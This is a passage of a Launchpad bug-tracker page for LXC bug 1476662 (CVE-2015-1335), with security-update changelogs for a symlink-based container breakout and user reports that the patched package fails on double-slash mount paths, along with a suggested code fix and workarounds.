            <time itemprop="commentTime" datetime="2015-09-22T20:07:16.573340+00:00" title="2015-09-22 20:07:16 UTC">on 2015-09-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/57"> #57</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471611/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against stable-1.1</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471611">Edit</a>
        (22.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/58" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-29T15:41:08.207456+00:00" title="2015-09-29 15:41:08 UTC">on 2015-09-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/58"> #58</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.1.2-0ubuntu3.2</p>
<p>---------------<br />
lxc (1.1.2-0ubuntu3.2) vivid-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary host file access and AppArmor<br />
&nbsp;&nbsp;&nbsp;&nbsp;confinement breakout via lxc-start following symlinks while<br />
&nbsp;&nbsp;&nbsp;&nbsp;setting up mounts within a malicious container (LP: <a href="/bugs/1476662" class="bug-link">#1476662</a>).<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0010-CVE-<wbr />2015-1335.<wbr />patch: block mounts to paths<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;containing symlinks and block bind mounts from relative paths<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;containing symlinks. Patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1335</p>
<p>&nbsp;-- Steve Beattie &lt;email address hidden&gt;  Tue, 22 Sep 2015 16:04:18 -0700</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.1.2-0ubuntu3.2

---------------
lxc (1.1.2-0ubuntu3.2) vivid-security; urgency=medium

  * SECURITY UPDATE: Arbitrary host file access and AppArmor
    confinement breakout via lxc-start following symlinks while
    setting up mounts within a malicious container (LP: #1476662).
    - debian/patches/0010-CVE-2015-1335.patch: block mounts to paths
      containing symlinks and block bind mounts from relative paths
      containing symlinks. Patch from upstream.
    - CVE-2015-1335

 -- Steve Beattie &lt;sbeattie@ubuntu.com&gt;  Tue, 22 Sep 2015 16:04:18 -0700</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/59" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-29T15:41:08.742690+00:00" title="2015-09-29 15:41:08 UTC">on 2015-09-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/59"> #59</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.0.7-0ubuntu0.5</p>
<p>---------------<br />
lxc (1.0.7-0ubuntu0.5) trusty-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Arbitrary host file access and AppArmor<br />
&nbsp;&nbsp;&nbsp;&nbsp;confinement breakout via lxc-start following symlinks while<br />
&nbsp;&nbsp;&nbsp;&nbsp;setting up mounts within a malicious container (LP: <a href="/bugs/1476662" class="bug-link">#1476662</a>).<br />
&nbsp;&nbsp;&nbsp;&nbsp;- debian/<wbr />patches/<wbr />0003-CVE-<wbr />2015-1335.<wbr />patch: block mounts to paths<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;containing symlinks and block bind mounts from relative paths<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;containing symlinks. Patch from upstream.<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2015-1335</p>
<p>&nbsp;-- Steve Beattie &lt;email address hidden&gt;  Tue, 22 Sep 2015 15:07:00 -0700</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.0.7-0ubuntu0.5

---------------
lxc (1.0.7-0ubuntu0.5) trusty-security; urgency=medium

  * SECURITY UPDATE: Arbitrary host file access and AppArmor
    confinement breakout via lxc-start following symlinks while
    setting up mounts within a malicious container (LP: #1476662).
    - debian/patches/0003-CVE-2015-1335.patch: block mounts to paths
      containing symlinks and block bind mounts from relative paths
      containing symlinks. Patch from upstream.
    - CVE-2015-1335

 -- Steve Beattie &lt;sbeattie@ubuntu.com&gt;  Tue, 22 Sep 2015 15:07:00 -0700</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
    
    <time title="2015-09-29 15:50:53 UTC" datetime="2015-09-29T15:50:53.707963+00:00">on 2015-09-29</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/60" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~weaver" class="sprite person">Andrey Kislyuk (weaver)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-29T21:41:16.765690+00:00" title="2015-09-29 21:41:16 UTC">on 2015-09-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/60"> #60</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Is 12.04 Precise affected by this vulnerability?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Is 12.04 Precise affected by this vulnerability?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/61" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-29T22:04:08.007026+00:00" title="2015-09-29 22:04:08 UTC">on 2015-09-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/61"> #61</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Chances are it is, but lxc in precise is in universe and on an unsupported upstream release, so we&#x27;re not doing security updates there.<br />
You can however use the upstream LXC PPA which will get you trusty&#x27;s LXC on precise, including this security fix.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Chances are it is, but lxc in precise is in universe and on an unsupported upstream release, so we're not doing security updates there.
You can however use the upstream LXC PPA which will get you trusty's LXC on precise, including this security fix.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/62" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~daniel-kraft" class="sprite person">Daniel Kraft (daniel-kraft)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T07:57:41.330655+00:00" title="2015-09-30 07:57:41 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/62"> #62</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We&#x27;re getting</p>
<p>lxc-start: utils.c: safe_mount: 1409 Mount of &#x27;proc&#x27; onto &#x27;/usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc//proc&#x27; was onto a symlink!</p>
<p>on all containers since we upgraded to 1.0.7-0ubuntu0.5 and they don&#x27;t start. No container has /proc as a symlink. Plese tell me what information is required from me.</p>
<p>We downgraded to 1.0.6-0ubuntu0.1 which works.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We're getting

lxc-start: utils.c: safe_mount: 1409 Mount of 'proc' onto '/usr/lib/x86_64-linux-gnu/lxc//proc' was onto a symlink!

on all containers since we upgraded to 1.0.7-0ubuntu0.5 and they don't start. No container has /proc as a symlink. Plese tell me what information is required from me.

We downgraded to 1.0.6-0ubuntu0.1 which works.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/63" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~daniel-kraft" class="sprite person">Daniel Kraft (daniel-kraft)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T08:29:04.504963+00:00" title="2015-09-30 08:29:04 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/63"> #63</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The problem lies in the ubuntu patch</p>
<p><a rel="nofollow" href="http://archive.ubuntu.com/ubuntu/pool/main/l/lxc/lxc_1.0.7-0ubuntu0.5.debian.tar.gz">http://<wbr />archive.<wbr />ubuntu.<wbr />com/ubuntu/<wbr />pool/main/<wbr />l/lxc/lxc_<wbr />1.0.7-0ubuntu0.<wbr />5.debian.<wbr />tar.gz</a></p>
<p>where this code</p>
<p>+	size_t start = croot ? strlen(croot) : 0;<br />
+	if (strcmp(ws + start, target + start) != 0) {<br />
+		ERROR(&quot;Mount onto %s resulted in %s\n&quot;, target, ws);<br />
+		goto out;<br />
+	}</p>
<p>in file 0003-CVE-<wbr />2015-1335.<wbr />patch checks if ws and start are the same.<br />
According to the given error (which I forgot to paste above), ws and target ARE different:</p>
<p>lxc-start: utils.c: ensure_not_symlink: 1384 Mount onto /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc//proc resulted in /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/proc</p>
<p>So target is</p>
<p>&nbsp;&nbsp;/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/lxc/<wbr />/proc</p>
<p>and ws is</p>
<p>&nbsp;&nbsp;&nbsp;/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/lxc/<wbr />proc</p>
<p>Any hints how we could prevent the double slashing? Or would you just &quot;clean up&quot; the path somehow?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The problem lies in the ubuntu patch

http://archive.ubuntu.com/ubuntu/pool/main/l/lxc/lxc_1.0.7-0ubuntu0.5.debian.tar.gz

where this code

+	size_t start = croot ? strlen(croot) : 0;
+	if (strcmp(ws + start, target + start) != 0) {
+		ERROR("Mount onto %s resulted in %s\n", target, ws);
+		goto out;
+	}

in file 0003-CVE-2015-1335.patch checks if ws and start are the same.
According to the given error (which I forgot to paste above), ws and target ARE different:

lxc-start: utils.c: ensure_not_symlink: 1384 Mount onto /usr/lib/x86_64-linux-gnu/lxc//proc resulted in /usr/lib/x86_64-linux-gnu/lxc/proc

So target is

  /usr/lib/x86_64-linux-gnu/lxc//proc

and ws is

   /usr/lib/x86_64-linux-gnu/lxc/proc

Any hints how we could prevent the double slashing? Or would you just "clean up" the path somehow?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/64" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T08:31:32.522630+00:00" title="2015-09-30 08:31:32 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/64"> #64</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Does  <a rel="nofollow" href="https://lists.linuxcontainers.org/pipermail/lxc-users/2015-September/010131.html">https:/<wbr />/lists.<wbr />linuxcontainers<wbr />.org/pipermail/<wbr />lxc-users/<wbr />2015-September/<wbr />010131.<wbr />html</a> point to the same problem?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Does  https://lists.linuxcontainers.org/pipermail/lxc-users/2015-September/010131.html point to the same problem?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/65" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~3-stephen" class="sprite person">Stephen Gaito (3-stephen)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T09:28:09.429703+00:00" title="2015-09-30 09:28:09 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/65"> #65</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have a similar problem (but not with /proc).</p>
<p>***Roman Fielder&#x27;s link (above) suggests the correct work around.***</p>
<p>My lxc configuration file has the following line:</p>
<p><span class="foldable-quoted">&gt;  lxc.mount.entry = /data/references /var/lib/<wbr />lxc/noteServer/<wbr />rootfs/<wbr />data/references none ro,bind 0 0
</span></p>
<p>(Note that the mount directory is an **absolute** path)</p>
<p>My resulting error message (in /var/log/<wbr />lxc/noteServer.<wbr />log) is:</p>
<p><span class="foldable-quoted">&gt;  lxc-start 1443599663.225 ERROR    lxc_utils - utils.c:<wbr />ensure_<wbr />not_symlink:<wbr />1384 - Mount onto /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc//data/<wbr />references resulted in /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/data/<wbr />references
</span></p>
<p>Tracing through the apt-get source lxc code I think the offending code (in the mount_entry_<wbr />on_absolute_<wbr />rootfs function in the lxc-1.0.<wbr />7/src/lxc/<wbr />conf.c file) is:</p>
<p><span class="foldable-quoted">&gt;        aux = strstr(<wbr />mntent-<wbr />&gt;mnt_dir, path);<br />
&gt;        if (aux) {<br />
&gt;                offset = strlen(path);<br />
&gt;                goto skipabs;<br />
&gt;        }<br />
&gt;<br />
&gt;skipvarlib:<br />
&gt;        aux = strstr(<wbr />mntent-<wbr />&gt;mnt_dir, rootfs-&gt;path);<br />
&gt;        if (!aux) {<br />
&gt;                WARN(&quot;ignoring mount point &#x27;%s&#x27;&quot;, mntent-&gt;mnt_dir);<br />
&gt;                goto out;<br />
&gt;        }<br />
&gt;        offset = strlen(<wbr />rootfs-<wbr />&gt;path);<br />
&gt;<br />
&gt;skipabs:<br />
&gt;<br />
&gt;        r = snprintf(path, MAXPATHLEN, &quot;%s/%s&quot;, rootfs-&gt;mount,<br />
&gt;                 aux + offset);
</span></p>
<p>Note that the last line should (probably -- I have not compiled any code to test this) be:</p>
<p><span class="foldable-quoted">&gt;        r = snprintf(path, MAXPATHLEN, &quot;%s/%s&quot;, rootfs-&gt;mount,<br />
&gt;                 aux + offset + 1);
</span></p>
<p>The &quot;+1&quot; then skips over the &quot;/&quot; in the mntent-&gt;mnt_dir so there will only be *one* &quot;/&quot; in the resulting path.</p>
<p>Note that the work around in Roman Fiedler&#x27;s link ensures that the mount entry uses the mount_entry_<wbr />on_relative_<wbr />rootfs function (which works) rather than the (currently broken?) mount_entry_<wbr />on_absolute_<wbr />rootfs function.</p>
<p>I can confirm that the following configuration line:</p>
<p><span class="foldable-quoted">&gt; lxc.mount.entry = /data/references data/references none ro,bind 0 0
</span></p>
<p>now in fact works, since it specifies a **relative** mount directory and so invokes the mount_entry_<wbr />on_relative_<wbr />rootfs function.</p>
<p>Many thanks for excellent **open source** tools!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have a similar problem (but not with /proc). 

***Roman Fielder's link (above) suggests the correct work around.***

My lxc configuration file has the following line:

&gt;  lxc.mount.entry = /data/references /var/lib/lxc/noteServer/rootfs/data/references none ro,bind 0 0

(Note that the mount directory is an **absolute** path)

My resulting error message (in /var/log/lxc/noteServer.log) is:

&gt;  lxc-start 1443599663.225 ERROR    lxc_utils - utils.c:ensure_not_symlink:1384 - Mount onto /usr/lib/x86_64-linux-gnu/lxc//data/references resulted in /usr/lib/x86_64-linux-gnu/lxc/data/references

Tracing through the apt-get source lxc code I think the offending code (in the mount_entry_on_absolute_rootfs function in the lxc-1.0.7/src/lxc/conf.c file) is:

&gt;        aux = strstr(mntent-&gt;mnt_dir, path);
&gt;        if (aux) {
&gt;                offset = strlen(path);
&gt;                goto skipabs;
&gt;        }
&gt;
&gt;skipvarlib:
&gt;        aux = strstr(mntent-&gt;mnt_dir, rootfs-&gt;path);
&gt;        if (!aux) {
&gt;                WARN("ignoring mount point '%s'", mntent-&gt;mnt_dir);
&gt;                goto out;
&gt;        }
&gt;        offset = strlen(rootfs-&gt;path);
&gt;
&gt;skipabs:
&gt;
&gt;        r = snprintf(path, MAXPATHLEN, "%s/%s", rootfs-&gt;mount,
&gt;                 aux + offset);

Note that the last line should (probably -- I have not compiled any code to test this) be:

&gt;        r = snprintf(path, MAXPATHLEN, "%s/%s", rootfs-&gt;mount,
&gt;                 aux + offset + 1);

The "+1" then skips over the "/" in the mntent-&gt;mnt_dir so there will only be *one* "/" in the resulting path.

Note that the work around in Roman Fiedler's link ensures that the mount entry uses the mount_entry_on_relative_rootfs function (which works) rather than the (currently broken?) mount_entry_on_absolute_rootfs function.

I can confirm that the following configuration line:

&gt; lxc.mount.entry = /data/references data/references none ro,bind 0 0

now in fact works, since it specifies a **relative** mount directory and so invokes the mount_entry_on_relative_rootfs function.

Many thanks for excellent **open source** tools!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/67" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~daniel-kraft" class="sprite person">Daniel Kraft (daniel-kraft)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-30T09:52:08.957000+00:00" title="2015-09-30 09:52:08 UTC">on 2015-09-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/67"> #67</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@roman-fiedler<br />
We&#x27;re using absolute mount targets here, so that might help. Will try this out.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@roman-fiedler
We're using absolute mount targets here, so that might help. Will try this out.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
